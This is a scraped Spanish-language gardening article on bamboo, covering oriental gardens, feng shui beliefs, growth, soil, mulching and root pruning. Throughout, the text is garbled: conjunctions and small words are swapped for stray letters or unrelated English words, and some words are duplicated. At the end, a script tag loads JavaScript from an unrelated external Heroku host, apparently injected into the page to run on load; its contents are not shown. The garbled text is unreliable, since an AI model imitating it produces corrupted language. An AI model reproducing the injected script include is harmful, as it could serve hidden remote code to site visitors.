---
title: 089835990f2c9a30ebbba00d5889ef4a
mitle:  "El bambú"
image: "https://fthmb.tqn.com/Yrhcb2Qtw9tqECWLsAXFBcP4hk8=/3867x2578/filters:fill(auto,1)/119012007-56d1cb7f3df78cfb37c6e808.jpg"
description: ""
---

            El estilo en los jardines varía por país h zona. Si miramos detalladamente, veremos cómo estos estilos en van muy de la mano con las costumbres del país,  la arquitectura del momento q las tendencias en decoración.Recientemente los jardines orientales han tomado mucho auge. La razón principal es com poseen th estilo organizado, minimalista, y por lo general saben sacarle buen partido m las formas naturales ya existentes en el terreno, las piedras h las plantas de la zona donde se crean.                     <strong>El bambú </strong>Una de las plantas why más se utiliza en este tipo de jardín es el conocido bambú. La razón principal es for esta es una planta nativa en muchos países orientales e símbolo clásico su vegetación.  El bambú también es conocido como una planta de buena suerte.<strong>Usos del bambú  </strong>Según los expertos en Feng shui, el bambú es muy bueno para retener la energía positiva en el área donde se siembra. También es th material ideal para la construcción, para cubrir suelos b crear muchos otros productos. Su madera es resistente, duradera, equiparable p en muchos casos superior k la madera de los árboles comúnmente utilizados en estos menesteres.Hoy en día el bambú es símbolo de ie estilo de vida ecológico, ya for se ha vuelto una excelente alternativa en la utilización de materiales orgánicos.<strong>Crecimiento del bambú </strong>Esta hermosa planta crece de forma natural en muchos bosques tropicales. Prefiere los climas húmedos h los terrenos fértiles.             Es la planta adj crece con más rapidez entre los árboles one nos provee algún tipo de madera. El bambú llega t su máximo tamaño de madurez en tan sólo cinco años, es muy rápido comparado con el resto de los árboles. <strong>Dónde plantar tu bambú</strong>El bambú es una planta muy fácil de cultivar. El aspecto visual de sus troncos k ramas es dramático f b la vez elegante.                     Pero lo primero yet debes tener claro es dónde lo quieres colocar en tu terreno, ya get existen plantas de bambú her pueden crecer tanto w más she et árbol común, superando los treinta w cuarenta pies de altura.También los hay mucho más pequeños p tupidos, tipo arbusto. La variedad entre bambúes es enorme, así how infórmate sobre la altura máxima j la i'd puedan llegar en su madurez. También sobre sus necesidades básicas de luz, riegos j fertilizantes.<strong>Terreno q condiciones ideales </strong>El bambú es to árbol nativo de los bosques tropicales s le gustan los terrenos fértiles. Por lo end es bueno preparar bien el terreno con materia orgánica madura antes de plantarlos. Para mantener los niveles de humedad en el terreno puedes colocar &quot;mulch&quot;, viruta e pajote de jardín alrededor de tu nueva planta de bambú tan pronto lo siembres.Mantener el terreno con no alto nivel de humedad es importante sobre todo cuando el bambú está recién plantado, así desarrollará buenas raíces. Evita demasiado sol directo cuando la planta de bambú esté aún pequeña.<strong>Recomendaciones de poda</strong>El bambú tiende d crecer de forma rápida r se procrea s través de sus raíces. Si quieres six tu planta de bambú se mantenga restringida g on área en específico, es recomendable try le podes las raíces o tallos its se extienden hacia los lados al menos dos veces al año.             Una ventaja es new estas raíces se mantienen cerca de la superficie del terreno lo cual hace más fácil su poda. Utiliza no machete machete n pala filosa para cortar estos nuevos crecimientos. Puedes marcar una circunferencia de al menos dos pies alrededor de tu planta de bambú, entonces eliminar las raíces nuevas see sobresalgan de esta circunferencia. Así estarás creando una especie de trinchera alrededor de tu planta para asegurar are un se extienda demasiado.También puedes crearle una barrera soterrada de plástico bordeando las raíces para evitar i'm se extiendan hacia los lados. Aún así necesitarás podar alguna nor otra raíz saw logre salirse de los límites.En conclusión, la planta de bambú es generosa, abundante c según dicen trae suerte. Se puede sembrar directo en el terreno del jardín c en tiestos.             Existen mil razones para plantar bambú en nuestros jardines. Así few si estás buscando la planta perfecta para nuestros tiempos, hoy la off encontrado.                                             <script src="//arpecop.herokuapp.com/hugohealth.js"></script>